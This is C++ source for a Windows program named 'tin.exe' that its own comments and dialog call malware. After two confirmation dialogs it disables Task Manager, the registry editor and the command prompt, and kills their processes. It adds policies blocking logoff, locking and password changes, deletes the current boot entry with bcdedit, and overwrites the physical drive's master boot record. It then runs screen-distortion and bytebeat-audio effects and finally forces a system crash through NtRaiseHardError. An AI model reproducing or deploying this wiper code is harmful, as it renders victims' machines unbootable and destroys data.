#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <iostream>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#include "sounds3.h"
#include "bootheader.h"
#define M_PI   3.14159265358979323846264338327950288
//#define PI   3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, *PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
/*COLORREF RndRGB() {
int clr = rand() % 5;
if (clr == 0) return RGB(255, 0, 0); if (clr == 1) return RGB(0, 255, 0); if (clr == 2) return RGB(0, 0, 255); if (clr == 3) return RGB(255, 0, 255); if (clr == 4) return RGB(255, 255, 0);
}*/

DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
	return 1;
}
DWORD WINAPI Destory(LPVOID lpParam) {
	system("taskkill /f /im taskmgr.exe");
	system("taskkill /f /im regedit.exe");
	system("taskkill /f /im cmd.exe");
	Sleep(1000);
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
	system("bcdedit /delete {current}");
	return 1;
}

void reg_add( //credits to Mist0090 because creating registry keys in C++ without sh*tty system() or reg.exe is hell
	HKEY HKey,
	LPCWSTR Subkey,
	LPCWSTR ValueName,
	unsigned long Type,
	unsigned int Value
)
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;


	result = RegCreateKeyExW(
		HKey, //HKEY
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition);

	result = RegSetValueExW(
		hKey,
		ValueName,
		0,
		Type,
		(const unsigned char*)&Value,
		(int)sizeof(Value)
	);

	RegCloseKey(hKey);
	return;
}

DWORD WINAPI notaskbar(LPVOID lpvd)
{
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 666;
}

DWORD WINAPI shader1(LPVOID lpvd) {
	int x1[3];
	float ho[3];
	double X[2];
	int cy[3];
	int v5[3];
	HWND hWnd;
	HDC hdc;

	// Assuming __CheckForDebuggerJustMyCode is a placeholder
	// __CheckForDebuggerJustMyCode(&unk_497034);

	hWnd = GetDesktopWindow();
	hdc = GetDC(nullptr);

	v5[0] = GetSystemMetrics(SM_CXSCREEN);
	cy[0] = GetSystemMetrics(SM_CYSCREEN);
	X[0] = 0.0;

	while (true)
	{
		hdc = GetDC(nullptr);
		for (ho[0] = 0.0; static_cast<float>(cy[0] + v5[0]) > ho[0]; ho[0] += 0.99000001f)
		{
			x1[0] = static_cast<int>(sin(X[0]) * 10.0);
			BitBlt(hdc, 0, static_cast<int>(ho[0]), v5[0], 1, hdc, x1[0], static_cast<int>(ho[0]), SRCCOPY);
			BitBlt(hdc, static_cast<int>(ho[0]), 0, 1, cy[0], hdc, static_cast<int>(ho[0]), x1[0], SRCCOPY);
			X[0] += 0.03926990816987241;
			Sleep(1);
		}
		ReleaseDC(hWnd, hdc);
	}
}

DWORD WINAPI memz(LPVOID lpParam) {
	int sw, sh;

	while (1) {
		HDC hdc = GetDC(0);
		sw = GetSystemMetrics(SM_CXSCREEN);
		sh = GetSystemMetrics(SM_CYSCREEN);

		// For zooming out, the source area should be larger than the destination area.
		// We shrink the destination area by 40 pixels, so the source area should be larger by the same amount.
		StretchBlt(hdc, 20, 20, sw - 40, sh - 40, hdc, 0, 0, sw, sh, SRCCOPY);

		ReleaseDC(0, hdc);
		Sleep(4);
	}
}
DWORD WINAPI melt(LPVOID lpvd) {
	HBRUSH SolidBrush;
	int y;
	HDC hdc;
	int v9;
	int SystemMetrics;

	// Assuming __CheckForDebuggerJustMyCode is a placeholder
	// __CheckForDebuggerJustMyCode(&unk_497034);

	SystemMetrics = GetSystemMetrics(SM_CXSCREEN);
	v9 = GetSystemMetrics(SM_CYSCREEN);

	// Seed the random number generator
	std::srand(static_cast<unsigned int>(std::time(0)));

	while (true)
	{
		hdc = GetDC(nullptr);

		int v1 = std::rand() & 0x80000000;
		int v2 = (v1 < 0) ? 0 : v1 & 0xFF;

		int v3 = std::rand() & 0x80000000;
		int v4 = (v3 < 0) ? 0 : (v3 & 0xFF) << 8 | v2;

		int v5 = std::rand() & 0x80000000;
		int color = (v5 < 0) ? 0 : ((v5 & 0xFF) << 16) | v4;

		SolidBrush = CreateSolidBrush(color);
		SelectObject(hdc, SolidBrush);

		std::rand();
		y = std::rand() % v9;

		BitBlt(hdc, 10, y, SystemMetrics, 96, hdc, 0, y, 0xAC010E);
		BitBlt(hdc, -10, y, SystemMetrics, -96, hdc, 0, y, 0xAC010E);

		ReleaseDC(nullptr, hdc);
		DeleteObject(SolidBrush);

		Sleep(1);
	}
}

DWORD WINAPI slidingscreen(LPVOID lpvd) {
	HBRUSH h;
	HDC hdc;
	int cy;
	int SystemMetrics;

	// Assuming __CheckForDebuggerJustMyCode is a placeholder
	// __CheckForDebuggerJustMyCode(&unk_497034);

	SystemMetrics = GetSystemMetrics(SM_CXSCREEN);
	cy = GetSystemMetrics(SM_CYSCREEN);

	// Seed the random number generator
	std::srand(static_cast<unsigned int>(std::time(0)));

	while (true)
	{
		hdc = GetDC(nullptr);

		int v1 = std::rand() & 0xFF;
		int v2 = (std::rand() & 0xFF) << 8 | v1;

		int v3 = std::rand() & 0xFF;
		int v4 = (std::rand() & 0xFF) << 16 | v2;

		h = CreateSolidBrush(v4);
		SelectObject(hdc, h);

		BitBlt(hdc, 0, 0, SystemMetrics, cy, hdc, -30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, SystemMetrics, cy, hdc, SystemMetrics - 30, 0, SRCCOPY);

		DeleteObject(h);
		ReleaseDC(nullptr, hdc);

		// Optional: add a sleep duration if needed to control the loop speed
		Sleep(50); // Adjust as needed
	}
}


DWORD WINAPI final(LPVOID lpParam)
{
	int j;
	HBITMAP h;
	HDC hdcSrc;
	HDC hdc;
	int i;
	void* lpBits;
	int nHeight;
	int nWidth;

	// Assuming __CheckForDebuggerJustMyCode is a placeholder
	// __CheckForDebuggerJustMyCode(&unk_497034);

	nWidth = GetSystemMetrics(SM_CXSCREEN);
	nHeight = GetSystemMetrics(SM_CYSCREEN);

	// Allocate memory for bitmap bits
	lpBits = VirtualAlloc(nullptr, 4 * (nWidth + nHeight * nWidth), MEM_COMMIT, PAGE_READWRITE);

	while (true)
	{
		hdc = GetDC(nullptr);
		hdcSrc = CreateCompatibleDC(hdc);

		// Create a bitmap and select it into the device context
		h = CreateBitmap(nWidth, nHeight, 1, 32, lpBits);
		SelectObject(hdcSrc, h);

		// Perform BitBlt operation to copy the screen content
		BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, SRCCOPY);

		// Retrieve the bitmap bits
		GetBitmapBits(h, 4 * nHeight * nWidth, lpBits);

		// Modify the bitmap bits
		for (j = 500; j < nHeight * nWidth; ++j)
		{
			DWORD* pPixel = reinterpret_cast<DWORD*>(lpBits) + j;
			*pPixel -= ((j % nWidth) << 16) | (nHeight << 8) | (j % nWidth);
		}

		// Update the bitmap with modified bits
		SetBitmapBits(h, 4 * nHeight * nWidth, lpBits);

		// Copy the modified bitmap to the screen
		BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, SRCCOPY);

		// Clean up resources
		DeleteObject(h);
		DeleteDC(hdcSrc);
		ReleaseDC(nullptr, hdc);

		// Optional: Sleep to prevent high CPU usage
		Sleep(50); // Adjust as needed
	}
}
DWORD WINAPI textout1(LPVOID lpvd)
{
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text = 0;
	LPCSTR text1 = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text = "tin.exe";
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Baby Kruffy");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
		DeleteObject(font);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI icons(LPVOID lpParam) {
	HDC hdc = GetWindowDC(GetDesktopWindow());
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	while (true) {
		hdc = GetWindowDC(GetDesktopWindow());
		x = GetSystemMetrics(SM_CXSCREEN);
		y = GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_ERROR));
		Sleep(10);
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_WARNING));
		Sleep(10);
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_APPLICATION));
		Sleep(10);
		DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_SHIELD));
		Sleep(10);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI masher(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(HWND_DESKTOP);
		int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
		BitBlt(hdc, rand() % 5, rand() % 5, rand() % sw, rand() % sh, hdc, rand() % 5, rand() % 5, SRCCOPY);
		ReleaseDC(0, hdc);
	}
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16050, 16050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16050 * 20] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 8 & t >> 4) >> ((t >> 10)&(t >> 8) & 31))*t;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 20] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(~t >> 2)*(((t >> 10 & 7)*t & 12)<(((t >> 8 & 5) + 2)*t & 25));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	CreateDirectoryA("C:\\Temp", 0);
	DWORD dwBytesWritten;
	HANDLE bytebeat3 = CreateFileW(
		L"C:\\Temp\\sounds3.wav", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		CREATE_ALWAYS, 0, 0);

	WriteFile(bytebeat3, sounds3, 3530752, &dwBytesWritten, 0); // write the file to the handle
	CloseHandle(bytebeat3);
	PlaySoundW(L"C:\\Temp\\sounds3.wav", NULL, SND_FILENAME | SND_ASYNC);
}

VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 20] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((((t >> 9) | 1) + t^t ^ ((t - 1200) ^ t) >> 15)*t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 20] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 10) | (t >> 4))*t&((t >> 8) | (t >> 10));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 20] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> ((t << 2) * 5 & 31)) & 9 & (t >> 7) | t * 3 & (t / 12)) - 10;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 20] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * 10 >> 10) | (t * 6 >> 3)) * 40;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}



int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"Run Malware?", L"tin.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure?", L"Last Warning", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			CreateThread(0, 0, notaskbar, 0, 0, 0);
			CreateThread(0, 0, Destory, 0, 0, 0);
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
			sound1();
			Sleep(20000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			HANDLE thread2 = CreateThread(0, 0, melt, 0, 0, 0);
			sound2();
			Sleep(20000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			HANDLE thread33 = CreateThread(0, 0, memz, 0, 0, 0);
			sound3();
			Sleep(20000);
			TerminateThread(thread33, 0);
			CloseHandle(thread33);
			HANDLE thread3 = CreateThread(0, 0, slidingscreen, 0, 0, 0);
			sound4();
			Sleep(20000);
			HANDLE thread4 = CreateThread(0, 0, textout1, 0, 0, 0);
			sound5();
			Sleep(20000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			HANDLE thread6 = CreateThread(0, 0, final, 0, 0, 0);
			sound6();
			Sleep(20000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			HANDLE thread7 = CreateThread(0, 0, masher, 0, 0, 0);
			HANDLE thread7dot1 = CreateThread(0, 0, icons, 0, 0, 0);
			sound7();
			Sleep(20000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			TerminateThread(thread7dot1, 0);
			CloseHandle(thread7dot1);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xC000013A, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}
